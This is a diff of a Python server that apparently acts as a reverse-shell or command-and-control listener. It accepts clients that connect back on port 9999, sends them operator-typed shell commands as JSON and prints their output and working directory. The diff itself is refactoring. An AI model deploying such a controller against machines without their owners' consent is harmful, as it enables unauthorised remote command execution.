@@ -5,10 +5,9 @@ import threading
 
 client_connections = {}
 client_connections_lock = threading.Lock()
-is_connected = False
+client_connected_event = threading.Event()
 
 def start_server(host='0.0.0.0', port=9999):
-    global is_connected
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server_socket.bind((host, port))
@@ -17,139 +16,108 @@ def start_server(host='0.0.0.0', port=9999):
 
     while True:
         client_socket, addr = server_socket.accept()
-        print(f"[*] Accepted connection from: {addr[0]}:{addr[1]}")
+        print(f"[+] Connection from {addr[0]}:{addr[1]} established.")
 
         with client_connections_lock:
-            client_connections[addr] = {"client_socket": client_socket, "current_directory": "~"}
+            client_connections[addr] = {
+                'socket': client_socket,
+                'current_directory': '~',
+                'response_event': threading.Event(),
+                'last_response': ''
+            }
+            client_connected_event.set()  # Signal that a client is connected
 
-        is_connected = True
-
-        client_handler = threading.Thread(target=handle_client, args=(client_socket,addr))
-        client_handler.start()
+        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
 
 
 def handle_client(client_socket, addr):
-    with client_connections_lock:
-        client_connections[addr] = {
-            'socket': client_socket,
-            'current_directory': '~'
-        }
-
     buffer = ""
     try:
         with client_socket as sock:
             while True:
-                chunk = sock.recv(1024)
+                chunk = sock.recv(4096)
                 if not chunk:
                     break
+
                 buffer += chunk.decode('utf-8')
-                # Process all complete messages in the buffer
+
                 while "\n" in buffer:
                     message, buffer = buffer.split("\n", 1)
                     try:
                         data = json.loads(message)
+                        if data.get("type") == "response":
+                            payload = data.get("payload", {})
+                            output = payload.get("output", "")
+                            current_directory = payload.get("current_directory", "~")
+
+                            with client_connections_lock:
+                                client_connections[addr]['current_directory'] = current_directory
+                                client_connections[addr]['last_response'] = output
+                                client_connections[addr]['response_event'].set()
                     except json.JSONDecodeError as e:
-                        print(f"Failed to decode JSON: {e}")
-                        continue
-
-                    # Update current directory
-                    with client_connections_lock:
-                        client_connections[addr]['current_directory'] = data['current_directory']
-
-                    # Print the client's response
-                    print(f"{data['response']}")
-
-                    # Signal the command loop if waiting
-                    with client_connections_lock:
-                        response_event = client_connections[addr].pop('response_event', None)
-                    if response_event:
-                        response_event.set()
-
-                    # Send an acknowledgment, using newline as a delimiter too
-                    sock.send(b"ACK\n")
+                        print(f"[!] JSON decode error from {addr}: {e}")
     finally:
         with client_connections_lock:
             if addr in client_connections:
                 del client_connections[addr]
-        print(f"[*] Connection closed by {addr}")
+                if not client_connections:
+                    client_connected_event.clear()  # Clear event if no clients connected
+        print(f"[-] Connection from {addr[0]}:{addr[1]} closed.")
 
 
-def send_to_client(client_addr, message):
-    """
-    Sends a message to the client identified by client_addr.
+def send_to_client(addr, command):
+    message = json.dumps({
+        "type": "command",
+        "payload": {"command": command}
+    }) + "\n"
 
-    Args:
-        client_addr (tuple): The address (IP, port) of the client.
-        message (str): The message to send.
-
-    Returns:
-        bool: True if the message was sent successfully, False otherwise.
-    """
-    # Use the lock to safely access the shared dictionary
     with client_connections_lock:
-        client_socket = client_connections.get(client_addr).get('client_socket')
+        client_socket = client_connections[addr]['socket']
+        response_event = client_connections[addr]['response_event']
+        response_event.clear()
 
-    if client_socket:
-        try:
-            # Convert the message to bytes (if not already bytes) and send it
-            client_socket.sendall(message.encode('utf-8'))
-            return True
-        except Exception as e:
-            print(f"[*] Error sending message to {client_addr}: {e}")
-            return False
-    else:
-        print(f"[*] Client {client_addr} not found.")
-        return False
+    try:
+        client_socket.sendall(message.encode('utf-8'))
+        response_event.wait(timeout=30)
+    except Exception as e:
+        print(f"[!] Error sending command to {addr}: {e}")
 
 def command_loop():
-    client_ip = '127.0.0.1'
-    client_port = 9999
+    print("[*] Waiting for clients to connect...")
+    client_connected_event.wait()  # Wait until at least one client connects
 
     while True:
-        if not is_connected:
-            continue
+        with client_connections_lock:
+            if not client_connections:
+                print("[*] Waiting for clients to reconnect...")
+                client_connected_event.wait()
 
-        try:
-                print('[*] Enter client IP and port to send commands.')
-                print('[*] Connected clients:')
-                with client_connections_lock:
-                    for addr in client_connections:
-                        print(f'[*] {addr[0]}:{addr[1]}')
+            print("\n[*] Connected Clients:")
+            for addr in client_connections:
+                print(f"  - {addr[0]}:{addr[1]}")
 
-                client_port = int(input("Enter client's port: "))
-                client_addr = (client_ip, client_port)
+        target_ip = input("Enter client IP: ").strip()
+        target_port = int(input("Enter client port: ").strip())
+        addr = (target_ip, target_port)
 
-                print('[*] Client connected. Type "exit" to quit.')
+        with client_connections_lock:
+            if addr not in client_connections:
+                print("[!] Client not connected.")
+                continue
+            current_directory = client_connections[addr]['current_directory']
 
-                while True:
-                    with client_connections_lock:
-                        current_directory = client_connections.get(client_addr, {}).get('current_directory', '~')
-                    message = input(f"{client_ip}:{current_directory} > ")
+        print(f"[+] Connected to {target_ip}:{target_port}. Type 'exit' to disconnect.")
+        while True:
+            command = input(f"{target_ip}:{current_directory}> ").strip()
 
-                    match message.strip():
-                        case 'exit':
-                            break
-                        case 'clear':
-                            os.system('clear')
-                            continue
+            if command.lower() == "exit":
+                break
+            elif command.lower() == "clear":
+                os.system("clear")
+                continue
 
-                    # Create and store an event for this command
-                    response_event = threading.Event()
-                    with client_connections_lock:
-                        client_connections[client_addr]['response_event'] = response_event
-
-                    successful = send_to_client(client_addr, message)
-                    if successful:
-                        response_event.wait()
-        except ValueError:
-            print('[*] Invalid port number.')
-        except KeyError:
-            print(f'[*] {client_ip}:{client_port} is not connected.')
-        except Exception as e:
-            print(f'[*] Unexpected error: {e}')
-
-
+            send_to_client(addr, command)
 
 if __name__ == "__main__":
-    threading.Thread(target=command_loop).start()
+    threading.Thread(target=command_loop, daemon=True).start()
     start_server()
